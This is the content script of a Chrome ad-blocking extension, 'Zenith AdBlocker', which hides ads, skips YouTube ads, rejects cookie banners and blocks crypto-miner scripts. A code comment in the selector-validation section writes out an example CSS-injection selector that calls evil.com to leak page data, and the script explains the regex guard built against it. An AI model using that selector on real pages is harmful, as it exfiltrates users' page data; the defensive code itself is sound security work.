/**
 * Zenith AdBlocker — Content Script (Chrome Only)
 * by roshanxcvi
 
 */

(async function () {
  'use strict';

  const hostname = window.location.hostname;
  if (!hostname) return;

  function send(data) {
    return new Promise(resolve => {
      try { chrome.runtime.sendMessage(data, r => resolve(r || null)); }
      catch (e) { resolve(null); }
    });
  }

  const state = await send({ type: 'GET_STATE' });
  if (!state || !state.enabled) return;
  if (state.whitelist && state.whitelist.some(d => hostname.includes(d))) return;

  let settings = {};
  try { const d = await chrome.storage.local.get('proSettings'); settings = (d && d.proSettings) || {}; } catch (e) {}
  const F = {
    ads: settings.adBlocking !== false,
    fp: settings.fingerprintProtection !== false,
    cookie: settings.cookieAutoReject !== false,
    annoy: settings.annoyanceBlocking !== false,
    miner: settings.minerBlocking !== false,
    antiAb: settings.antiAdblock !== false,
  };

  const isYouTube = hostname.includes('youtube.com');

  // ═══════════════════════════════════
  // FINGERPRINT PROTECTION
  // ═══════════════════════════════════
  if (F.fp) {
    try {
      // I-01 — fetch per-install seed so different Zenith installs return
      // different (but consistent) spoofed values. Without this, every
      // Zenith user reports the same hardwareConcurrency=4, deviceMemory=8,
      // GPU strings, etc., which is itself a fingerprint of "user has Zenith".
      let seed = null;
      try {
        const sd = await chrome.storage.local.get('zenithFpSeed');
        seed = sd.zenithFpSeed || null;
        if (!seed) {
          // Generate one and persist it (this only happens once per install)
          const a = new Uint32Array(4);
          crypto.getRandomValues(a);
          seed = `${a[0].toString(36)}${a[1].toString(36)}${a[2].toString(36)}${a[3].toString(36)}`;
          await chrome.storage.local.set({ zenithFpSeed: seed });
        }
      } catch (e) {}

      const s = document.createElement('script');
      s.src = chrome.runtime.getURL('fingerprint.js');
      if (seed) s.dataset.zenithSeed = seed;
      s.onload = () => s.remove();
      (document.head || document.documentElement)?.appendChild(s);
    } catch (e) {}
  }

  // ═══════════════════════════════════
  // AD BLOCKING
  // ═══════════════════════════════════
  if (F.ads) {
    let selectors = [];
    try {
      const r = await send({ type: 'GET_COSMETIC_FILTERS', hostname });
      if (r && r.selectors) selectors = r.selectors;
    } catch (e) {}

    // ═══════════════════════════════════
    // PROCEDURAL COSMETIC FILTERS
    // (:has-text, :upward, :matches-css, etc.)
    // ═══════════════════════════════════
    try {
      const procResp = await send({ type: 'GET_PROCEDURAL_FILTERS', hostname });
      if (procResp && procResp.filters && procResp.filters.length > 0) {
        const startProcedural = async () => {
          try {
            const mod = await import(chrome.runtime.getURL('modules/procedural-filters.js'));
            const proc = new mod.ProceduralFilters();
            for (const f of procResp.filters) proc.add(f);
            proc.observe(1500);
          } catch (e) {}
        };
        if (document.readyState === 'complete') startProcedural();
        else window.addEventListener('load', startProcedural);
      }
    } catch (e) {}

    // ═══════════════════════════════════
    // SCRIPTLETS — request background to inject via chrome.scripting
    // (CSP-safe — background uses chrome.scripting.executeScript)
    // ═══════════════════════════════════
    try {
      send({ type: 'INJECT_SCRIPTLETS', hostname });
    } catch (e) {}

    // Generic selectors — SAFE on all sites including YouTube
    // These are precise enough to never match navigation/header elements
    const GENERIC = [
      'ins.adsbygoogle',
      '[id^="google_ads"]',
      '[id^="div-gpt-ad"]',
      '[data-google-query-id]',
      '[data-ad-slot]',
      '[data-ad-client]',
      '[data-native-ad]',
      '[class*="gpt-ad"]',
      '.dfp-ad',
      'iframe[src*="doubleclick"]',
      'iframe[src*="googlesyndication"]',
      'iframe[src*="amazon-adsystem"]',
      'iframe[id*="google_ads"]',
      '.OUTBRAIN',
      '[id*="taboola"]',
      '[class*="taboola"]',
      '[id*="outbrain"]',
      '[class*="outbrain"]',
    ];

    // These selectors are ONLY applied on non-YouTube sites
    // They're too generic and can match YouTube UI elements
    const NON_YOUTUBE_ONLY = [
      '.ad-banner','.ad-container','.ad-wrapper','.ad-slot','.ad-unit',
      '.ad-placement','.ad-leaderboard','.ad-sidebar','.ad-footer','.ad-box',
      '.advertisement','.advertise',
      '.sponsored-content','.sponsored','.promoted-post','.promoted',
      '.sidebar-ad','.sticky-ad','.floating-ad','.interstitial-ad','.overlay-ad',
    ];

    let allSel = [...new Set([...selectors, ...GENERIC])];
    if (!isYouTube) {
      allSel = [...new Set([...allSel, ...NON_YOUTUBE_ONLY])];
    }

    // CI-01 FIX (v1.2) — validate selectors BEFORE building CSS, and
    // reject any selector that could break out of a CSS rule.
    //
    // querySelector() accepts a selector like
    //   a[title="}*{background:url(//evil.com/leak)"]
    // because braces are legal INSIDE a quoted attribute value. But once
    // we concatenate it into `${selector}{display:none}` and drop it into
    // a <style>, the CSS parser reads the }*{ as structural and the
    // attacker has injected an arbitrary rule into every page — a CSS
    // exfiltration vector (leaking attribute values / element presence via
    // background-image requests to an attacker server).
    //
    // Defense in depth:
    //   1. reject selectors containing raw  {  }  @  ;  or a closing
    //      </style sequence — none are valid in a real element selector
    //   2. still require querySelector() to accept it (catches other
    //      syntax errors so one bad rule doesn't break the rest)
    const CSS_BREAKOUT = /[{}@;]|<\/?style/i;
    const validSelectors = [];
    for (const s of allSel) {
      if (typeof s !== 'string' || !s.trim()) continue;
      if (s.length > 500) continue;                 // absurdly long = suspicious
      if (CSS_BREAKOUT.test(s)) continue;           // CSS-injection guard
      try {
        document.querySelector(s);                  // throws on syntax error
        validSelectors.push(s);
      } catch (_) { /* malformed selector — skip */ }
    }

    // Build CSS from the VALIDATED list only.
    let css = validSelectors.map(s =>
      `${s}{display:none!important;visibility:hidden!important;height:0!important;overflow:hidden!important}`
    ).join('\n');

    // YouTube-specific: SCOPED to safe containers only
    if (isYouTube) {
      css += `
/* YouTube video ad overlays — inside player only */
.ytp-ad-module{display:none!important}
.ytp-ad-overlay-slot{display:none!important}
.ytp-ad-overlay-container{display:none!important}
.ytp-ad-text-overlay{display:none!important}
.ytp-ad-message-slot{display:none!important}
.ytp-ad-image-overlay{display:none!important}
.video-ads{display:none!important}

/* YouTube feed ads — scoped to content area, NOT header */
#contents ytd-ad-slot-renderer{display:none!important}
#contents ytd-promoted-sparkles-web-renderer{display:none!important}
#contents ytd-promoted-video-renderer{display:none!important}
#contents ytd-in-feed-ad-layout-renderer{display:none!important}
#contents ytd-display-ad-renderer{display:none!important}
#related ytd-promoted-sparkles-web-renderer{display:none!important}
#related ytd-ad-slot-renderer{display:none!important}
#below ytd-ad-slot-renderer{display:none!important}

/* YouTube player-area ads only */
#player-ads{display:none!important}
#player ytd-player-legacy-desktop-watch-ads-renderer{display:none!important}
ytd-engagement-panel-section-list-renderer[target-id="engagement-panel-ads"]{display:none!important}

/* YouTube masthead ad (NOT #masthead which is the real header) */
#masthead-ad{display:none!important}
ytd-video-masthead-ad-v3-renderer{display:none!important}

/* Promo bars inside content */
#content .ytd-mealbar-promo-renderer{display:none!important}
#content ytd-primetime-promo-renderer{display:none!important}
`;
    }

    try {
      const style = document.createElement('style');
      style.id = 'zenith-hide';
      style.textContent = css;
      (document.head || document.documentElement)?.appendChild(style);
    } catch (e) {}

    // countSelector reuses the validated, breakout-safe list from above.
    const countSelector = validSelectors.join(',');

    function countOnce() {
      if (!countSelector) return; // nothing to count
      try {
        const count = document.querySelectorAll(countSelector).length;
        if (count > 0) send({ type: 'REPORT_BLOCKED', count });
      } catch (e) {}
    }
    if (document.readyState === 'complete') {
      setTimeout(countOnce, 500);
      setTimeout(countOnce, 3000);
    } else {
      window.addEventListener('load', () => {
        setTimeout(countOnce, 500);
        setTimeout(countOnce, 3000);
      });
    }

    // YouTube ad killer — only on youtube.com
    if (isYouTube) {
      // M-03 — track interval and observer so SPA navigations don't
      // stack multiple of each over the lifetime of the page.
      let ytInterval = null;
      let ytObserver = null;

      function killYouTubeAd() {
        let killed = 0;
        // Click skip button
        const skip = document.querySelector('.ytp-ad-skip-button, .ytp-ad-skip-button-modern, .ytp-skip-ad-button');
        if (skip) { skip.click(); killed++; }
        // Skip to end of ad video
        const video = document.querySelector('video.html5-main-video');
        if (video && document.querySelector('.ad-showing')) {
          if (video.duration > 0 && video.currentTime < video.duration - 0.5) {
            video.currentTime = video.duration;
          }
          video.muted = true;
          killed++;
        }
        // Close overlay
        const close = document.querySelector('.ytp-ad-overlay-close-button');
        if (close) { close.click(); killed++; }
        if (killed > 0) send({ type: 'REPORT_BLOCKED', count: killed });
      }

      function startYT() {
        const player = document.querySelector('#movie_player');
        if (!player) { setTimeout(startYT, 2000); return; }

        // M-03 — clean up any previous observer/interval before creating
        // new ones. Otherwise SPA route changes accumulate timers.
        try { if (ytObserver) ytObserver.disconnect(); } catch (_) {}
        if (ytInterval) { clearInterval(ytInterval); ytInterval = null; }

        // Watch ONLY player class changes — not subtree
        ytObserver = new MutationObserver(() => {
          if (player.classList.contains('ad-showing')) killYouTubeAd();
        });
        ytObserver.observe(player, { attributes: true, attributeFilter: ['class'] });

        // Backup check every 1.5 seconds
        ytInterval = setInterval(() => {
          if (document.querySelector('.ad-showing')) killYouTubeAd();
        }, 1500);
      }

      // M-03 — also clear timers when the page is unloaded
      window.addEventListener('pagehide', () => {
        try { if (ytObserver) ytObserver.disconnect(); } catch (_) {}
        if (ytInterval) { clearInterval(ytInterval); ytInterval = null; }
      });

      if (document.readyState === 'complete') setTimeout(startYT, 1000);
      else window.addEventListener('load', () => setTimeout(startYT, 1000));
    }
  }

  // ═══════════════════════════════════
  // COOKIE AUTO-REJECT
  // ═══════════════════════════════════
  if (F.cookie) {
    // Curated list of known CMP/cookie-banner button selectors.
    // These are SPECIFIC IDs/classes — clicking them is safe because they
    // belong to known consent management platforms (OneTrust, Cookiebot,
    // Didomi, Quantcast, etc) which Zenith has audited.
    const BTNS = [
      '#onetrust-reject-all-handler','#CybotCookiebotDialogBodyButtonDecline',
      '#didomi-notice-disagree-button','.qc-cmp2-summary-buttons button[mode="secondary"]',
    ];
    // Containers that hold cookie banners. Text-based button matching is
    // SCOPED to descendants of these containers ONLY — never the whole page.
    const BANNERS = [
      '#onetrust-banner-sdk','#CybotCookiebotDialog','.truste_overlay','.qc-cmp2-container',
      '#didomi-host','[class*="cookie-banner"]','[class*="cookie-consent"]',
      '[class*="cookie-notice"]','[id*="cookie-consent"]','[class*="gdpr"]',
      '[class*="consent-banner"]','[class*="cc-window"]','.fc-consent-root',
      // aria-based scopes (only the container, then we search inside)
      '[role="dialog"][aria-label*="cookie" i]','[role="dialog"][aria-label*="consent" i]',
    ];
    const RE = [/^reject\s*(all)?$/i,/^deny\s*(all)?$/i,/^decline\s*(all)?$/i,/^no,?\s*thanks?$/i,/^only\s*(essential|necessary)/i];

    // H-A FIX — a button is only safe to auto-click if it has no inline
    // event handlers (which a malicious page could use to exfiltrate data
    // when Zenith clicks it). Also reject anchors pointing off-domain.
    function isSafeToClick(b) {
      if (!b || b.offsetParent === null) return false;
      // No inline event handlers
      const evtAttrs = ['onclick','onmousedown','onmouseup','onpointerdown','onpointerup','onauxclick'];
      for (const a of evtAttrs) if (b.hasAttribute(a)) return false;
      // No external-origin href on anchors
      if (b.tagName === 'A' && b.href) {
        try {
          const u = new URL(b.href, location.href);
          if (u.origin !== location.origin && !u.href.startsWith('javascript:void')) return false;
          if (u.href.startsWith('javascript:') && !u.href.startsWith('javascript:void')) return false;
        } catch (e) { return false; }
      }
      return true;
    }

    function reject() {
      // Step 1: try the curated SAFE selectors first. These are specific
      // to known CMPs so we trust them.
      for (const s of BTNS) {
        try {
          const b = document.querySelector(s);
          if (b && b.offsetParent !== null) { b.click(); return; }
        } catch (e) {}
      }

      // Step 2: text-based matching, but SCOPED to descendants of known
      // CMP banner containers ONLY. We never scan the whole page for
      // "reject"-like text — a malicious page could host a hidden button
      // with that text and an onclick handler to exfiltrate data.
      const bannerEls = [];
      for (const s of BANNERS) {
        try {
          const found = document.querySelectorAll(s);
          for (const e of found) bannerEls.push(e);
        } catch (e) {}
      }
      for (const banner of bannerEls) {
        const candidates = banner.querySelectorAll('button, a[role="button"], [role="button"]');
        for (const b of candidates) {
          const t = (b.textContent || '').trim();
          if (t.length === 0 || t.length > 50) continue;
          if (RE.some(r => r.test(t)) && isSafeToClick(b)) {
            b.click();
            return;
          }
        }
        // Also try aria-label inside the banner
        const ariaBtns = banner.querySelectorAll('button[aria-label*="reject" i], button[aria-label*="deny" i], button[aria-label*="decline" i]');
        for (const b of ariaBtns) {
          if (isSafeToClick(b)) { b.click(); return; }
        }
      }

      // Step 3: as a fallback, hide any banner containers that are still
      // visible. Hiding is safe (no code execution) so this is broader.
      for (const s of BANNERS) {
        try {
          const e = document.querySelector(s);
          if (e) e.style.setProperty('display','none','important');
        } catch (e) {}
      }
      try { document.body.style.overflow=''; document.documentElement.style.overflow=''; } catch (e) {}
    }
    const go = () => { setTimeout(reject, 800); setTimeout(reject, 3000); };
    if (document.readyState === 'complete') go(); else window.addEventListener('load', go);
  }

  // ═══════════════════════════════════
  // ANNOYANCE BLOCKING — CSS only, skip on YouTube
  // ═══════════════════════════════════
  if (F.annoy && !isYouTube) {
    try {
      const style = document.createElement('style');
      style.id = 'zenith-annoy';
      style.textContent = [
        '[class*="newsletter-popup"]','[class*="subscribe-popup"]','[class*="signup-modal"]',
        '[class*="email-popup"]','[class*="exit-intent"]','[class*="push-notification"]',
        '#intercom-container','#intercom-frame','[class*="intercom-"]',
        '#drift-widget','#hubspot-messages-iframe-container',
        '[class*="crisp-client"]','#tidio-chat','[class*="tawk-"]','[class*="freshchat"]',
        '[class*="app-banner"]','[class*="smart-banner"]','[class*="sticky-video"]',
      ].map(s => `${s}{display:none!important}`).join('\n');
      (document.head || document.documentElement)?.appendChild(style);
    } catch(e){}
  }
  if (F.annoy) {
    try { if (typeof Notification !== 'undefined') Notification.requestPermission = () => Promise.resolve('denied'); } catch(e){}
  }

  // ═══════════════════════════════════
  // CRYPTO MINER — watches <head> only
  // ═══════════════════════════════════
  if (F.miner) {
    const M = ['coinhive.com','coin-hive.com','crypto-loot.com','jsecoin.com','coinimp.com','minero.cc','mineralt.io','cryptonoter.com'];
    try {
      const obs = new MutationObserver((muts) => {
        for (const m of muts) for (const n of m.addedNodes) {
          if (n.nodeName === 'SCRIPT' && n.src && M.some(d => n.src.includes(d))) n.remove();
        }
      });
      if (document.head) obs.observe(document.head, { childList: true });
    } catch(e){}
  }

  // ═══════════════════════════════════
  // ANTI-ADBLOCK — CSS only, skip on YouTube
  // ═══════════════════════════════════
  if (F.antiAb && !isYouTube) {
    try {
      const style = document.createElement('style');
      style.id = 'zenith-antiab';
      style.textContent = [
        '[class*="adblock-notice"]','[class*="anti-adblock"]','[id*="adblock-message"]',
        '[class*="ad-blocker-detected"]','[class*="adblock-overlay"]',
        '[class*="adblock-modal"]','[class*="adblock-warning"]',
      ].map(s => `${s}{display:none!important}`).join('\n');
      (document.head || document.documentElement)?.appendChild(style);
    } catch(e){}
    setTimeout(() => { try { document.body.style.overflow=''; document.documentElement.style.overflow=''; } catch(e){} }, 3000);
  }

  // ═══════════════════════════════════
  // ELEMENT PICKER
  // ═══════════════════════════════════
  try {
    // L-C — refuse to hide structural elements; doing so blanks the page
    // with no undo.
    const STRUCTURAL = new Set(['HTML','HEAD','BODY','MAIN']);
    function isStructural(el) {
      if (!el || !el.tagName) return true;
      if (STRUCTURAL.has(el.tagName)) return true;
      // Also refuse anything that contains the document body
      try { if (el.contains(document.body)) return true; } catch (e) {}
      return false;
    }

    chrome.runtime.onMessage.addListener((msg) => {
      if (msg.type === 'PICK_ELEMENT') {
        document.body.style.cursor = 'crosshair';
        let last = null;
        const hover = (e) => {
          if (last) last.style.outline = '';
          if (isStructural(e.target)) { last = null; return; } // don't highlight unhideable elements
          e.target.style.outline = '3px solid #e74c3c';
          last = e.target;
        };
        const pick = (e) => {
          e.preventDefault(); e.stopPropagation();
          const target = e.target;
          if (isStructural(target)) {
            // Quietly refuse — restore cursor and clean up
            document.body.style.cursor = 'default';
            document.removeEventListener('click', pick, true);
            document.removeEventListener('mouseover', hover, true);
            return;
          }
          target.style.outline = '';
          target.style.setProperty('display', 'none', 'important');
          document.body.style.cursor = 'default';
          document.removeEventListener('click', pick, true);
          document.removeEventListener('mouseover', hover, true);
          send({ type: 'REPORT_BLOCKED', count: 1 });
        };
        document.addEventListener('mouseover', hover, true);
        document.addEventListener('click', pick, true);
        document.addEventListener('keydown', function esc(e) {
          if (e.key === 'Escape') {
            if (last) last.style.outline = '';
            document.body.style.cursor = 'default';
            document.removeEventListener('click', pick, true);
            document.removeEventListener('mouseover', hover, true);
            document.removeEventListener('keydown', esc, true);
          }
        }, true);
      }
    });
  } catch (e) {}

})();
